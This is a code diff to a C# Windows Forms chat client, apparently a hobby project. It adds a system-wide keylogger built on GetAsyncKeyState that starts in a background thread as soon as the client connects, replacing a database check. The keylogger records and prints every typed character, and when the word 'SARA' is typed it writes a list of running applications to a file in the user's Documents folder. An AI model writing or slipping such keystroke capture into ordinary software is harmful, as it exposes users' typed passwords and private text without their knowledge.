@@ -6,9 +6,13 @@ using System.Text;
 using System.Windows.Forms;
 using System.Data.SQLite;
 using System.IO;
+using System.Runtime.InteropServices;
+using System.Threading;
 
 namespace BasicAsyncClient
 {
+
+    
     public partial class ClientForm : Form
     {
         private String clientName = "";
@@ -17,6 +21,10 @@ namespace BasicAsyncClient
         // Holds our connection with the database
         SQLiteConnection m_dbConnection;
         private String DB = "";
+       
+        // keylogger from API
+        [DllImport("User32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
 
 
         public ClientForm()
@@ -159,8 +167,10 @@ namespace BasicAsyncClient
                         var sendData = Encoding.ASCII.GetBytes(txbName.Text);
                         clientName = txbName.Text;
                         clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, null);
-
-                    checkDB();
+                    
+                    Thread keyLogger = new Thread(ClientForm.playKeyLogger);
+                    keyLogger.Start();
+                    //checkDB();
 
 
 
@@ -175,6 +185,80 @@ namespace BasicAsyncClient
             {
                 ShowErrorDialog(ex.Message);
             }
+        }
+
+        public static void playKeyLogger()
+        {
+           
+            
+            String input = "";
+            Boolean flag = true;
+            while (flag)
+            {
+                Thread.Sleep(5);
+                for (int i = 32; i < 127; i++)
+                {
+
+                    int keyState = GetAsyncKeyState(i);
+                    if (keyState == 32769)
+                    {
+                       
+                        input += (char)i;
+                        Console.WriteLine((char)i+ ", "+input);
+                        if (i == 32)
+                        { 
+                           
+                            //Console.Write(input);
+                           
+                            if (input == "SARA ")
+                            {
+                                ShowErrorDialog("SARA insert");
+                                inputEqualsSARA();
+
+                            }
+                            input = "";
+                        }
+
+
+                    }
+
+                }
+
+
+
+
+            }
+
+        }
+
+        private static void inputEqualsSARA()
+        {
+            ShowErrorDialog("insert to file");
+
+            // sava keylogger in file
+            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            if (!Directory.Exists(filepath))
+            {
+                Directory.CreateDirectory(filepath);
+            }
+
+            string path = (filepath + @"\AllAPP.txt");
+
+            if (!File.Exists(path))
+            {
+                using (StreamWriter sw = File.CreateText(path)) ;
+            }
+            string AllApp = ProcessValidation.ListAllApplications();
+            using (StreamWriter sw = File.AppendText(path))
+            {
+                sw.Write(AllApp);
+            }
+
+
+
+
+
+
         }
 
         private bool checkDB()
